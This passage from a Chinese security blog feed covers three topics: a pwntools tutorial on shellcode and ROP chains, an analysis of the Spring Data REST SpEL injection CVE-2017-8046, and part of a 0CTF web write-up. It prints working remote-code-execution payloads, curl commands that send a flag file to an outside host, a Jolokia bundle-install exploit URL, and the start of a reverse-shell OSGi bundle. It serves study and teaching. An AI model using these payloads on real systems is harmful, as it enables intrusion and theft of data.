class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.arch      = <span class="string">'i386'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.os        = <span class="string">'linux'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.endian    = <span class="string">'little'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.word_size = <span class="number">32</span></span><br></pre></td></tr></table></figure><p>使用disasm进行反汇编：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> disasm(<span class="string">'6a0258cd80ebf9'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line">   <span class="number">0</span>:   <span class="number">6</span>a <span class="number">02</span>                   push   <span class="number">0x2</span></span><br><span class="line">   <span class="number">2</span>:   <span class="number">58</span>                      pop    eax</span><br><span class="line">   <span class="number">3</span>:   cd <span class="number">80</span>                   int    <span class="number">0x80</span></span><br><span class="line">   <span class="number">5</span>:   eb f9                   jmp    <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>注意，asm需要binutils中的as工具辅助，如果是不同于本机平台的其他平台的汇编，例如在我的x86机器上进行mips的汇编就会出现as工具未找到的情况，这时候需要安装其他平台的cross-binutils。</p><h3 id="Shellcode生成器"><a href="#Shellcode生成器" class="headerlink" title="Shellcode生成器"></a>Shellcode生成器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> shellcraft.i386.nop().strip(<span class="string">'\n'</span>)</span><br><span class="line">    nop</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> shellcraft.i386.linux.sh()</span><br><span class="line">    /* push <span class="string">'/bin///sh\x00'</span> */</span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    push <span class="number">0x732f2f2f</span></span><br><span class="line">    push <span class="number">0x6e69622f</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>结合asm可以可以得到最终的pyaload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh())</span><br></pre></td></tr></table></figure><p>除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等。</p><h3 id="ROP链生成器"><a href="#ROP链生成器" class="headerlink" title="ROP链生成器"></a>ROP链生成器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">'ropasaurusrex'</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">rop.read(<span class="number">0</span>, elf.bss(<span class="number">0x80</span>))</span><br><span class="line">rop.dump()</span><br><span class="line"><span class="comment"># ['0x0000:        0x80482fc (read)',</span></span><br><span class="line"><span class="comment">#  '0x0004:       0xdeadbeef',</span></span><br><span class="line"><span class="comment">#  '0x0008:              0x0',</span></span><br><span class="line"><span class="comment">#  '0x000c:        0x80496a8']</span></span><br><span class="line">str(rop)</span><br><span class="line"><span class="comment"># '\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08'</span></span><br></pre></td></tr></table></figure><p>使用ROP(elf)来产生一个rop的对象，这时rop链还是空的，需要在其中添加函数。</p><p>因为ROP对象实现了<strong>getattr</strong>的功能，可以直接通过func call的形式来添加函数，rop.read(0, elf.bss(0x80))实际相当于rop.call(‘read’, (0, elf.bss(0x80)))。<br> 通过多次添加函数调用，最后使用str将整个rop chain dump出来就可以了。</p><ul><li>call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)</li><li>chain() : 返回当前的字节序列，即payload</li><li>dump() : 直观地展示出当前的rop chain</li><li>raw() : 在rop chain中加上一个整数或字符串</li><li>search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget</li><li>unresolve(value) : 给出一个地址，反解析出符号</li></ul><h3 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h3><p>当在运行py时添加参数M，则会将进程attach到GDB上调试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> args.M:</span><br><span class="line">        gdb.attach(p)</span><br></pre></td></tr></table></figure><h3 id="DEBUG日志"><a href="#DEBUG日志" class="headerlink" title="DEBUG日志"></a>DEBUG日志</h3><p>当 context.log_level被设置为 “DEBUG” , 我们的输入和服务器的输出会被直接输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br></pre></td></tr></table></figure><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.jianshu.com/p/355e4badab50" target="_blank" rel="noopener">pwntools使用</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/categories/Pwn/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>浅析Spring Data Rest之cve-2017-8046</title>
    <link href="https://Mi1k7ea.github.com/2019/04/05/Spring-Data-Rest%E4%B9%8Bcve-2017-8046%E5%88%86%E6%9E%90/"/>
    <id>https://Mi1k7ea.github.com/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/</id>
    <published>2019-04-04T16:38:13.000Z</published>
    <updated>2019-06-02T10:04:50.899Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-何为Spring-Data-Rest"><a href="#0x01-何为Spring-Data-Rest" class="headerlink" title="0x01 何为Spring Data Rest"></a>0x01 何为Spring Data Rest</h2><blockquote><p>Spring Data REST是基于Spring Data的repository之上，可以把 repository 自动输出为REST资源，目前支持Spring Data JPA、Spring Data MongoDB、Spring Data Neo4j、Spring Data GemFire、Spring Data Cassandra的 repository 自动转换成REST服务。注意是自动。简单点说，Spring Data REST把我们需要编写的大量REST模版接口做了自动化实现。</p></blockquote><h2 id="0x02-CVE-2017-8046"><a href="#0x02-CVE-2017-8046" class="headerlink" title="0x02 CVE-2017-8046"></a>0x02 CVE-2017-8046</h2><p>CVE-2017-8046: RCE in PATCH requests in Spring Data REST</p><p>简单地说，该漏洞就是攻击者通过Spring Data Rest支持的PATCH方法，构造恶意的Json格式数据发送到服务端，导致服务端在解析数据时会执行任意Java代码、解析SpEL表达式，从而引发SpEL注入漏洞、造成RCE。</p><p>影响版本：</p><ul><li>Spring Data REST versions 2.5.12, 2.6.7, 3.0 RC3之前的版本</li><li>Spring Boot versions 2.0.0M4 之前的版本</li><li>Spring Data release trains Kay-RC3 之前的版本</li></ul><p>漏洞具体信息参考<a href="https://pivotal.io/cn/security/cve-2017-8046" target="_blank" rel="noopener">链接</a>。</p><p>有个注意点，请求方法为PATCH，Content-Type要设置为application/json-patch+json才能正常访问。</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>在github下载一个<a href="https://github.com/cved-sources/cve-2017-8046/blob/master/build/spring-data-rest.jar" target="_blank" rel="noopener">漏洞Demo jar包</a>。</p><p>本地运行并设置远程调试端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xdebug -Xrunjdwp:transport=dt_socket,address=8666,server=y,suspend=n -server -jar spring-data-rest.jar</span><br></pre></td></tr></table></figure><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>访问一遍，显示有两个子路径可以访问：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/1.png" alt=""></p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/2.png" alt=""></p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/3.png" alt=""></p><p>/persons显示已有哪些创建了的用户，而/profile只有一个子目录/profile/persons、其用来配置persons页面的字段属性等信息。</p><p>下面正常操作一遍，先创建用户，GET查看到用户信息：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/4.png" alt=""></p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/5.png" alt=""></p><p>利用PATCH方法的replace操作修改lastName：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/6.png" alt=""></p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>本次CVE的漏洞出发点在PATCH请求进行某些操作如replace时的path参数存在SpEL注入风险，Spring Data Rest在解析该参数值时会使用spelExpress解析SpEL表达式而未进行任何的校验。</p><p>我们可以简单地以上面的PATCH例子往path中注入一下SpEL表达式，作用是本地弹出计算器，注意payload后面的斜杠/必须带上，但lastName可以随意更换为其他内容（至于原因可在下面的调试分析中得知）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">'calc.exe'</span>)/lastName</span><br></pre></td></tr></table></figure><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/7.png" alt=""></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>刚刚已经开了进行远程调试监听的8666端口，直接用IDEA远程连接即可。</p><p>简单说下操作：将jar包解压，在IDEA中创建新项目，再右键项目点击Open Module Settings打开设置，在Modules一栏点击右边的+加号添加jar解压后的目录中的lib目录进来，然后点击Apply和OK；点击Run栏，选择Edit Configurations，点击+加号添加Remote，设置IP和端口号为8666，然后点击Debug，当显示Connected to the target VM, address: ‘127.0.0.1:8666’, transport: ‘socket’时即连接成功。</p><p><strong>断点打在哪？</strong></p><p>我们前面的Demo示例是通过PATCH方法的replace操作来触发漏洞的，也就是说，我们的操作必然会经过PATCH方法的replace操作类，那么我们找到这个类打断点，程序就必然会经过并停止在该断点，然后我们通过函数调用栈窗口可以反推之前调用哪些类方法，再返回去在关键的地方打断点重新调试即可。</p><p>这里我们找到该类在如下路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring-data-rest/BOOT-INF/lib/spring-data-rest-webmvc-2.6.6.RELEASE.jar!/org/springframework/data/rest/webmvc/json/patch/ReplaceOperation.class</span><br></pre></td></tr></table></figure><p>在该处打下断点，必然会经过此处，且看到函数调用栈中有个JsonPatchHandler类，该类应该算是处理Json格式的PATCH请求的类：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/8.png" alt=""></p><p>到JsonPatchHandler类的apply()和applyPatch()打下断点，重新调试会发现，JsonPatchHandler.apply()方法会调用isJsonPatchRequest()判断请求是否是Json格式的Patch，跟踪进去会发现会校验请求方法是否为PATCH且Content-Type是否为application/json-patch+json，否则会抛出错误，这就是为什么Content-Type必须设置为该值才能触发的原因：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/9.png" alt=""></p><p>跟踪往下调试进去applyPatch()，其后调用了Patch.convert()，其中识别出replace操作：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/10.png" alt=""></p><p>继续调试进去，会有个初始化Patch操作的构造函数，从这里可以看到前面Demo为啥需要op等3个参数，且最后一个成员变量spelExpression即是用来解析SpEL表达式的变量，它是SpEL注入漏洞的触发根源，这里调用PathToSpEL.pathToExpression()来解析path参数：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/11.png" alt=""></p><p>继续跟进调试，发现其进行一个split()切分/的操作，这就解释了为啥Demo的payload中path参数值需要在exp后加上/，因为它这里必须切分路径，而默认正常情况下是“/lastName”：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/12.png" alt=""></p><p>接着是调用pathNodesToSpEL()，通过调试发现是对/转换为.，然后将path前后路径用.进行拼接：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/13.png" alt=""></p><p>往下调试，有个初始化spelExpression类对象，其中expression成员变量值为我们注入的SpEL表达式：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/14.png" alt=""></p><p>往下调试，会创建一个PATCH对象并初始化，然后调用operation.perform()执行PATCH指定操作：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/15.png" alt=""></p><p>跟进去，调用了setValueOnTarget()，再往后走就是SpEL解析了：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/16.png" alt=""></p><p>这里我们跟进去看看evaluateValueFromTarget()，顾名思义，该方法用来计算出SpEL表达式的值，其是调用之前初始化好的spelExpression成员变量来解析SpEL表达式：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/17.png" alt=""></p><p>再往下就是解析完成弹框计算器了。</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/18.png" alt=""></p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>我们看下<a href="https://github.com/spring-projects/spring-data-rest/commit/8f269e28fe8038a6c60f31a1c36cfda04795ab45" target="_blank" rel="noopener">官方补丁</a>的修补方法：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/19.png" alt=""></p><p>补丁就是在evaluateValueFromTarget()函数内添加了对path参数值的路径进行合法性校验，若为非法内容则直接抛出错误。</p><h2 id="0x04-exp构造"><a href="#0x04-exp构造" class="headerlink" title="0x04 exp构造"></a>0x04 exp构造</h2><h3 id="通用exp"><a href="#通用exp" class="headerlink" title="通用exp"></a>通用exp</h3><p>之前本地的exp是，但是这个只能用于本地环境测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">'calc.exe'</span>)/lastName</span><br></pre></td></tr></table></figure><p>换一个远程服务的exp就不能上面那样写了，因为没有回显，下面有两种解决办法。</p><p><strong>Method1——执行curl带回flag</strong></p><p>当然这种情况是目标机子存在curl命令且能够解析`反引号执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">'curl yourip:port/?c=`cat flag`'</span>)/lastName</span><br></pre></td></tr></table></figure><p>但是从前面的调试知道，程序会切分/，因此命令中的/会被切分导致不能到达预期效果，这时就引入了第二种更方便的方法。</p><p><strong>Method2——构造回显exp</strong></p><p>情况当然没有那么好，`反引号很多时候会无法被正常解析，这时就使用如下的StreamUtils包的copy()方法实现输入输出流来构造回显exp即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(<span class="string">'cat flag.txt'</span>).getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())/Mi1k7ea</span><br></pre></td></tr></table></figure><p>示例以Windows本地为例：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/20.png" alt=""></p><h3 id="使用JavaScipt引擎"><a href="#使用JavaScipt引擎" class="headerlink" title="使用JavaScipt引擎"></a>使用JavaScipt引擎</h3><p>和之前的javacon中的exp类似，这里再演示一遍。</p><p>先来本地弹计算器测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).eval(T(java.lang.Runtime).getRuntime().exec(<span class="string">'calc.exe'</span>))/Mi1k7ea</span><br></pre></td></tr></table></figure><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/21.png" alt=""></p><p><strong>Method1——URL编码</strong></p><p>前面遇到的情况是通用exp是一样的，即无法在命令中输入/，但我们可以通过URL编码绕过：</p><p>URL编码内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(&apos;curl http://192.168.43.201:1234/?`whoami`&apos;)</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).eval(T(java.net.URLDecoder).decode(<span class="string">'%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%34%33%2e%32%30%31%3a%31%32%33%34%2f%3f%60%77%68%6f%61%6d%69%60%27%29'</span>))/Mi1k7ea</span><br></pre></td></tr></table></figure><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/22.png" alt=""></p><p>可以看到是执行成功了，但是`反引号并没有被成功解析成命令执行。</p><p>这时用curl -T参数来将flag带回我们的FTP服务器中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).eval(T(java.net.URLDecoder).decode(<span class="string">'%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%75%72%6c%20%2d%54%20%66%6c%61%67%2e%74%78%74%20%66%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%34%33%2e%32%30%31%27%29'</span>))/Mi1k7ea</span><br></pre></td></tr></table></figure><p>其中URL编码内容为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(<span class="string">'curl -T flag.txt ftp://192.168.43.201'</span>)</span><br></pre></td></tr></table></figure><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/23.png" alt=""></p><p><strong>Method2——构造回显exp</strong></p><p>和通用exp中一样，利用一样的包的copy()方法实现回显。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).eval(T(java.lang.Runtime).getRuntime().exec(<span class="string">'calc'</span>)),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())/Mi1k7ea</span><br></pre></td></tr></table></figure><p>这个exp只能在Windows本地打开计算器等文件的功能，执行变量其他操作类的命令：</p><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/25.png" alt=""></p><p>添加个URL编码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).eval(T(java.net.URLDecoder).decode(<span class="string">'%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%70%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29'</span>)),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())/Mi1k7ea</span><br></pre></td></tr></table></figure><p>其中URL编码内容为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(<span class="string">"ipconfig"</span>).getInputStream()</span><br></pre></td></tr></table></figure><p><img src="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/24.png" alt=""></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>直接参考Github上的一个<a href="https://github.com/m3ssap0/spring-break_cve-2017-8046" target="_blank" rel="noopener">项目</a>即可。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
      <category term="SpEL注入" scheme="https://Mi1k7ea.github.com/tags/SpEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>0CTF Web writeup</title>
    <link href="https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/"/>
    <id>https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/</id>
    <published>2019-03-31T02:56:21.000Z</published>
    <updated>2019-05-28T14:19:47.405Z</updated>
    
    <content type="html"><![CDATA[<p>本次writeup，纯属复现 : )</p><h2 id="0x01-Ghost-Pepper"><a href="#0x01-Ghost-Pepper" class="headerlink" title="0x01 Ghost Pepper"></a>0x01 Ghost Pepper</h2><p><a href="http://111.186.63.207:31337/" target="_blank" rel="noopener">题目地址</a></p><p>访问题目，提示该站点是Karaf，需要输入用户名和密码：</p><p><img src="/2019/03/31/0CTF-Web-writeup/1.png" alt=""></p><p>Karaf是一个基于OSGi的框架，而OSGi是一个Java平台，允许在运行时管理应用程序组件的生命周期，而无需重新启动应用程序。我们可以在应用程序运行时在运行时添加/删除/替换组件，部署多个版本等。Karaf框架中的用户名和密码默认均为karaf，输入进去后是个404页面：</p><p><img src="/2019/03/31/0CTF-Web-writeup/2.png" alt=""></p><p>页面显示是使用Jetty作为Web服务器的，除此之外没找到更多的信息。</p><p>搜一下题目Ghost pepper，在Wiki百科发现其别名为Bhut jolokia，然后再搜索一遍Bhut jolokia，发现Jolokia是一个JMX-HTTP桥接器，可替代JSR-160连接器。它是一种基于代理的方法，支持许多平台。除了基本的JMX操作之外，它还通过批量请求和细粒度安全策略等独特功能增强了JMX远程处理功能。</p><p>那就是说，该站点应该支持Jolokia，访问一下该路径看看，果然返回了Json格式的数据：</p><p><img src="/2019/03/31/0CTF-Web-writeup/3.png" alt=""></p><p>访问list，列出Jolokia所支持的所有操作：</p><p><img src="/2019/03/31/0CTF-Web-writeup/4.png" alt=""></p><p>这里只列下前面的Java类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">java.util.logging</span><br><span class="line">org.eclipse.jetty.server.session</span><br><span class="line">org.ops4j.pax.web.service.jetty.internal</span><br><span class="line">org.eclipse.jetty.jmx</span><br><span class="line">osgi.compendium</span><br><span class="line">java.nio</span><br><span class="line">org.apache.karaf</span><br><span class="line">JMImplementation</span><br><span class="line">org.eclipse.jetty.util.thread</span><br><span class="line">java.lang</span><br><span class="line">com.sun.management</span><br><span class="line">jmx4perl</span><br><span class="line">connector</span><br><span class="line">sun.nio.ch</span><br><span class="line">org.eclipse.jetty.server</span><br><span class="line">org.apache.aries.blueprint</span><br><span class="line">org.eclipse.jetty.io</span><br><span class="line">osgi.core</span><br><span class="line">jolokia</span><br></pre></td></tr></table></figure><p>注意到org.apache.karaf这个类，就是说我们可以通过Karaf JMX执行各种操作。下面就来找下该karaf类所支持的所有方法：</p><p><img src="/2019/03/31/0CTF-Web-writeup/5.png" alt=""></p><p>其中可以看到很多操作命名为install，因此我们可以利用这些API来加载安装并部署我们直接编写的恶意jar程序。</p><p>下面有两种方法来解它。</p><h3 id="Method1——安装WebConsole"><a href="#Method1——安装WebConsole" class="headerlink" title="Method1——安装WebConsole"></a>Method1——安装WebConsole</h3><p>Karaf框架是拥有一个WebConsole的，可以通过Web端进行控制台的交互，前面我们获取了org.apache.karaf的所有支持的方法，找到其中的installFeature()，编写如下安装WebConsole的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.186.63.207:31337/jolokia/exec/org.apache.karaf:name=root,type=feature/installFeature(java.lang.String)/webconsole</span><br></pre></td></tr></table></figure><p><img src="/2019/03/31/0CTF-Web-writeup/6.png" alt=""></p><p>然后在URL栏访问Karaf的WebConsole界面，直接输入命令即可得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.186.63.207:31337/system/console/gogo</span><br></pre></td></tr></table></figure><p><img src="/2019/03/31/0CTF-Web-writeup/7.png" alt=""></p><h3 id="Method2——安装恶意bundle"><a href="#Method2——安装恶意bundle" class="headerlink" title="Method2——安装恶意bundle"></a>Method2——安装恶意bundle</h3><p>在之前的org.apache.karaf类中，还可以参考<a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper" target="_blank" rel="noopener">这篇文章</a>通过install方法来进行利用。</p><p>除了该类外，还可以通过osgi.core的installBundleFromURL，这个方法可以通过URL来安装bundle，我们可以通过如下的方法找到该方法：</p><p><img src="/2019/03/31/0CTF-Web-writeup/8.png" alt=""></p><p>此时我们可以构造一个恶意bundle打包成jar放置在我们自己的服务器中，然后访问Karaf服务让其下载并安装部署我们的恶意bundle从而实现反弹shell：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.osgi.framework.BundleActivator;</span><br><span class="line"><span class="keyword">import</span> org.osgi.framework.BundleContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Activator</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">BundleActivator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(BundleContext paramBundleContext)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String str = <span class="string">"1.2.3.4"</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">12345</span>;</span><br><span class="line"></span><br><span class="line">        Socket localSocket = <span class="keyword">new</span> Socket(str, i);</span><br><span class="line"></span><br><span class="line">        localSocket.getOutputStream().write(<span class="string">"Mi1k7ea"</span>.getBytes());</span><br><span class="line">        localSocket.getOutputStream().flush();</span><br><span class="line"><span class="comment">// localSocket.close();</span></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        